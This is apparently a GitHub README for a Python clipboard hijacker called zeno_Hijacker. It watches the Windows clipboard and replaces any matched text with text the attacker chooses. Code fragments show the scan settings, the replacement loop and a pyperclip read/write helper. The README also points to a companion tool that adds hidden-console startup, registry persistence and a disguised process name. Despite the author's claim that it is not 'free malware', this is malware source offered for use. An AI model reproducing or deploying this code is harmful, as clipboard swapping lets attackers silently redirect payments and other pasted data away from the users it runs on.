![alt text](https://github.com/Zurek0x/zeno_Hijacker/blob/main/media/Screenshot_1.png?raw=true)
This is a Windows API Built clipboard hijacker written in Python (Source Only), There is no
sepcial features like ( Hide Console , Boot with windows, Etc ) this is not made
to be "free malware", If it detects a piece of text inside of the clipboard like (out) in (malkaOUTnzb) it will execute a piece of code replacing
it with another piece of text like (malkaINnzb), This can be used for a numerous amount of things.

# Usage (Pieces of code, Look in Source)
```python
# =?/Settings/?= #
time_delay_per_scan = 0.2 # ?Seconds
```
**Time to delay between each scan, Incase of CPU/RAM overloads, Always keep this above 0.1 or 0.2**
```python
cache = [""] # Cache (Do not touch this)
substring = ["Test1", "Test2"] # If it detects string in clipboard then run code
passString = ["Pasted"] # Item to be ignored (exempt) from code
```
**Explained in notes/code**
```python
39)                            # Add more of these "elif x == int(1)" for whatever you need to paste per list.
40)                            if x == int(0):
41)                                statement=str("Found_0_in_substring_List!")
42)                                func.data_handle.write(statement)
43)                                ## / print(statement)
44)                            elif x == int(1):
45)                                statement=str("Found_1_in_substring_List!")
46)                                func.data_handle.write(statement)
47)                                ## / print(statement)
```
**x == int(0) , If it detects item 0 in array then it will execute code under the statement
and so on for the other elif**

# Zeno_func.py
```python
import pyperclip

class data_handle():
    def read():
        value = pyperclip.paste()
        return value
    def write(self):
        pyperclip.copy(f'{self}')
```
**handles read and write of clipboard inside class and function.**
# Starting up with windows and extra stuff
Features involve
> * Hide Console
> * Boot with Windows
> * Install to custom folder
> * Add to registry
> * Change process name/title
To use these features you must import the code into zeno_Embedder which is a tool to do exactly this -> https://github.com/Zurek0x/zeno_Embedder
